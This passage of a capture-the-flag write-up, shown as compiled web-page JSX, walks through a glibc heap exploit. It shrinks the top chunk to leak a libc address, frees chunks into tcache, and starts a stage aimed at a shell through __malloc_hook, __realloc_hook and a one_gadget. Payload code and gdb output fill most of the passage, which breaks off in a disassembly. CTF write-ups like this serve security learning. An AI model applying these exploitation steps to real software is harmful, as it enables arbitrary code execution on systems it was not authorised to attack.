\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# chunk data\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x8\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Prevsize\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xd51\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Malloc 0x1000 bytes\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1000\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"After overwrite top chunk size:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/10xg 0x0000564641e852a0-0x10\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e85290: 0x0000000000000000  0x0000000000000021\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852a0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852b0: 0x0000000000000000  0x0000000000000d51\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852c0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852d0: 0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"After \",(0,e.jsx)(n.code,{children:\"malloc(0x1000)\"}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/10xg 0x0000564641e852a0-0x10\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e85290: 0x0000000000000000  0x0000000000000021\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852a0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852b0: 0x0000000000000000  0x0000000000000d31\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852c0: 0x00007fb00a6b0be0  0x00007fb00a6b0be0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852d0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  heap bin\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500 Tcachebins for thread 1 \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`All tcachebins are empty\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500 Fastbins for arena 0x7fb00a6b0b80 \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=0, size=0x20] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=1, size=0x30] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=2, size=0x40] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=3, size=0x50] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=4, size=0x60] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=5, size=0x70] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Fastbins[idx=6, size=0x80] 0x00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500 Unsorted Bin for arena 'main_arena' \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] unsorted_bins[0]: fw=0x564641e852b0, bk=0x564641e852b0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:` \\u2192   Chunk(addr=0x564641e852c0, size=0xd30, flags=PREV_INUSE)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Found 1 chunks in unsorted bin.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500 Small Bins for arena 'main_arena' \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Found 0 chunks in 0 small non-empty bins.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500 Large Bins for arena 'main_arena' \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Found 0 chunks in 0 large non-empty bins.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We can see that the top chunk is freed and goes into unsorted bin. At here, the program write libc main arena to that chunk so we can see stuff at that freed top chunk. The address for the \",(0,e.jsx)(n.code,{children:\"malloc(0x1000)\"}),\" is placed in the next page and saved in the stack like this:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571be0\\u2502+0x0000: \"B=malloc(4096)\\\\n\"   \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571be8\\u2502+0x0008: \"(4096)\\\\n\"\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571bf0\\u2502+0x0010: 0x0000564641e852a0  \\u2192  0x0000000000000000    <-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571bf8\\u2502+0x0018: 0x0000564641ea6010  \\u2192  0x0000000000000000    <-- Chunk index 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c00\\u2502+0x0020: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c08\\u2502+0x0028: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c10\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c18\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"So now, let\\u2019s leak the libc main arena address in the freed top chunk first. To do that, we just simply malloc an amount which is smaller than freed top chunk (which turn into unsorted bin) because malloc() doesn\\u2019t remove data on that chunk (just free() does), and then print the libc main arena address out (Address changed because I rerun it):\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`malloc(2, 0x100)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`puts(2)\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Running it and we get the libc main arena address leaked:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/libc_main_arena_address_leaked.png\",alt:\"libc_main_arena_address_leaked.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Stack contain the chunk with index 2:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bc90\\u2502+0x0000: \"puts(C)\\\\n\"  \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bc98\\u2502+0x0008: 0x00000a2936353200\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bca0\\u2502+0x0010: 0x0000555ddbd4f2a0  \\u2192  0x0000000000000000    <-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bca8\\u2502+0x0018: 0x0000555ddbd70010  \\u2192  0x0000000000000000    <-- Chunk index 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bcb0\\u2502+0x0020: 0x0000555ddbd4f2c0  \\u2192  0x00007f416cfea1e0    <-- Chunk index 2\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bcb8\\u2502+0x0028: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bcc0\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe5fd1bcc8\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Compared with chunk 2 data and we know it\\u2019s correct. Now we will do a simple calculation to get the offset between that leaked address with libc base address. We can get libc base address using \",(0,e.jsx)(n.code,{children:\"vmmap\"}),\" (for gdb-gef I think so)\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/vmmap_libc_base.png\",alt:\"vmmap_libc_base.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So the libc base address is \",(0,e.jsx)(n.code,{children:\"0x00007f416cdfe000\"}),\", the leaked address is \",(0,e.jsx)(n.code,{children:\"0x00007f416cfea1e0\"}),\", the offset will be:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007f416cfea1e0 - 0x00007f416cdfe000 = 0x1ec1e0\n`})})}),`\n`,(0,e.jsx)(n.p,{children:\"So every time we get the leaked libc main arena address, we just subtract with this offset and we have the libc base address. That\\u2019s great for now! Let\\u2019s move on the second stage: Free 2 small chunks!\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-2-free-2-small-chunks\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-2-free-2-small-chunks\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 2: Free 2 small chunks\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Now, we will continue using the above technique to free 2 top chunk with small size. Do you still remember we have already chunk index 1 which in the new page of heap? This time, we will reuse that to overwrite the new top chunk size again.\"}),`\n`,(0,e.jsx)(n.p,{children:\"Before we do that, let\\u2019s see the new top chunk size next to chunk 1. Because I re-run program so address changed. This is new stack address:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4d0\\u2502+0x0000: \"puts(C)\\\\n\"  \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4d8\\u2502+0x0008: 0x00000a2936353200\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4e0\\u2502+0x0010: 0x0000557c12fa02a0  \\u2192  0x0000000000000000    <-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4e8\\u2502+0x0018: 0x0000557c12fc1010  \\u2192  0x0000000000000000    <-- Chunk index 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4f0\\u2502+0x0020: 0x0000557c12fa02c0  \\u2192  0x00007f5c373161e0    <-- Chunk index 2\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007fffcd05f248\\u2502+0x0028: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007fffcd05f250\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007fffcd05f258\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"So new top chunk size now is:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  # x/4xg <chunk index 1> + 0x1000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/4xg 0x000055cb4beae010 + 0x1000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fc2010: 0x0000000000000000  0x0000000000020ff1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fc2020: 0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We need to make top chunk size smaller such as 0x300, so we need to malloc another chunk with the size \",(0,e.jsx)(n.code,{children:\"0xcf0\"}),\" with this calculation:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`0xff1 - 0x300 - 0xcf1\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will want to malloc \",(0,e.jsx)(n.code,{children:\"0xcf0-0x10\"}),\" because there is heap metadata, so if we \",(0,e.jsx)(n.code,{children:\"malloc(0xcf0)\"}),\", the total size will be \",(0,e.jsx)(n.code,{children:\"0xcf0 + 0x10 = 0xd00\"}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`malloc(1, 0xcf0-0x10)\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Why I use index 1? Just because we don\\u2019t use those 0x1000 byte of chunk 1 anymore so we reuse index 1 again. After \",(0,e.jsx)(n.code,{children:\"malloc(1, 0xcf0-0x10)\"}),\", the stack where chunk 1 is placed changed:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4d0\\u2502+0x0000: \"B=malloc(3296)\\\\n\"   \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4d8\\u2502+0x0008: \"(3296)\\\\n\"\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4e0\\u2502+0x0010: 0x0000557c12fa02a0  \\u2192  0x0000000000000000    <-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4e8\\u2502+0x0018: 0x0000557c12fc2020  \\u2192  0x0000000000000000    <-- Chunk index 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4f0\\u2502+0x0020: 0x0000557c12fa02c0  \\u2192  0x00007f5c373161e0    <-- Chunk index 2\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4f8\\u2502+0x0028: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f500\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f508\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Let\\u2019s check if our top chunk size if changed correctly:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/4xg 0x0000557c12fc2020 + (0xcf0 - 0x10)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fc2d00: 0x0000000000000000  0x0000000000020301\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fc2d10: 0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So now we just need to change top chunk size, then \",(0,e.jsx)(n.code,{children:\"malloc(0x1000)\"}),\" again and we have a 0x300-byte chunk is freed:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change top chunk size\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x301\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"               \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Remember PREV_INUSE bit\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Trigger to free top chunk\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1000\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Do you notice why I use chunk 2 to trigger to free top chunk? Because after we trigger that, the top chunk will go to tcache. So with the remain of chunk 1 address, we can control the freed top chunk.\"}),`\n`,(0,e.jsx)(n.p,{children:\"Running script and we get our first freed chunk in tcache:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/free_topchunk_into_tcache1.png\",alt:\"free_topchunk_into_tcache1.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"So with the chunk 2, we will do the same as chunk 1 to get the second freed chunk:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change top chunk size to 0x20300\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Overwrite top chunk size to 0x300\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x301\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Trigger to free top chunk\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1000\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And we get the second freed chunk in tcache:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/free_topchunk_into_tcache2.png\",alt:\"free_topchunk_into_tcache2.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"With 2 freed chunk in tcache, we are very closed to the shell. Let\\u2019s move on final stage: Get shell!\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-3-get-shell\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-3-get-shell\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 3: Get shell\"]}),`\n`,(0,e.jsx)(n.p,{children:\"This time, we will abuse tcache link list by changing forward pointer to whatever place we want. But first, let\\u2019s find a one gadget that we can use:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/one_gadget.png\",alt:\"one_gadget.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will use the first one, which has constraints is r15 and r12 is null. Because if we changed \",(0,e.jsx)(n.code,{children:\"__malloc_hook\"}),\" once, it can hardly be recovered to malloc() again. So this is a one hit one kill situation.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"The idea is to overwrite \",(0,e.jsx)(n.code,{children:\"__malloc_hook\"}),\" with realloc() and overwrite \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\" with one gadget. The aim is to \",(0,e.jsx)(n.code,{children:\"pop\"}),\" null byte to r15 and r12. At the epilouge of realloc(), there is \",(0,e.jsx)(n.code,{children:\"pop r12\"}),\" and \",(0,e.jsx)(n.code,{children:\"pop r15\"}),\". So that\\u2019s why we will jump to realloc first. This is the assembly code of realloc:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  disas realloc\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Dump of assembler code for function __GI___libc_realloc:\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8000 <+0>:   endbr64\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8004 <+4>:   push   r15\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8006 <+6>:   push   r14\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8008 <+8>:   push   